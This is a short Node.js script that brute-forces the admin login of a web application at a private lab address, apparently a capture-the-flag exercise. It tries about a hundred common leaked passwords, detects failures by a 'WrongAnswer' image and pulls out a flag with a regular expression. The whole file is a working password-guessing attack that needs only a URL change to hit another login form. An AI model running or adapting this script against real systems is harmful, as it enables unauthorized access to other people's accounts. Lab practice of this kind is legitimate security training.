const axios = require('axios');

const url = 'http://192.168.64.2/index.php?page=signin';
const passwords = [ "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "696969", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "pussy", "superman", "1qaz2wsx", "7777777", "fuckyou", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "fuckme", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "asshole", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "fuck", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "6969", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "minecraft" ]

async function findFlag() {
    for (let password of passwords) {
        try {
            const response = await axios.post(url, null, {
                params: {
                    username: 'admin',
                    password: password,
                    Login: 'Login',
                }
            });

            // Check if the response contains the "WrongAnswer.gif" image indicating failure
            if (response.data.includes('<img src="images/WrongAnswer.gif" alt="">')) {
                console.log(`Password "${password}" is incorrect, trying next...`);
                continue;  // If the password is wrong, continue to the next one
            }

            // If the "WrongAnswer.gif" image is not found, attempt to extract the flag
            const regex = /The flag is : ([a-zA-Z0-9]+)/;
            const match = response.data.match(regex);

            if (match && match[1]) {
                console.log(`The flag is: ${match[1]}`);
                return; // Stop once we find the flag
            }

        } catch (error) {
            console.error('Error occurred:', error);
        }
    }

    console.log('No flag found. Try expanding the password list.');
}

// Run the function
findFlag();
